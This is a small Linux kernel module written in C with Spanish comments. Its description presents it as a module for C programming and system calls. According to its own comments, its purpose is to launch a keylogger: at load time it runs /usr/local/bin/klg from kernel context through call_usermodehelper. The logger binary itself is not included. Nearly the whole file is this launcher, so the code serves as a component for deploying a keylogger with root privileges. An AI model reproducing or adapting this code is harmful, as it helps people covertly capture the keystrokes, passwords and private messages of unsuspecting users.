#include <linux/module.h>/* Necesario en todos los modulos */
#include <linux/kernel.h> /* Necesario para alertas e info como KERN_INFO */
#include <linux/init.h> /* Necesario para las macros init y exit */

/*
  Mediante la siguiente funcion lanzamos el programa de registro de teclas
*/
static int init_klg (void)
{
  static char *argv[]={"/usr/local/bin/klg", NULL};
  static char *envp[]={"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin", NULL};
  static int ret;

  /* Lanza el programa en el ambiente de usuario. UMH_WAIT_EXEC indica que no lo espere*/
  ret = call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);

  /* Revisamos si la ejecucion se llevo a cabo */
  if (ret != 0)
    printk("Problemas llamando a usermodehelper: %i\n", ret);
  else
    printk("everything all right\n");
  return 0;
}

static int __init inicio(void)
{
  printk(KERN_INFO "Iniciando modulo \n");
  return init_klg(); /* Llamando la funcion auxiliar para lanzar el programa */
}

static void __exit fin(void)
{
  printk(KERN_INFO "Finalizando modulo \n");
}

module_init(inicio);
module_exit(fin);

MODULE_LICENSE ("GPL");
MODULE_AUTHOR("Mario Arturo Perez Rangel");
MODULE_DESCRIPTION("Modulo para programacion en C y llamdas al sistema.");

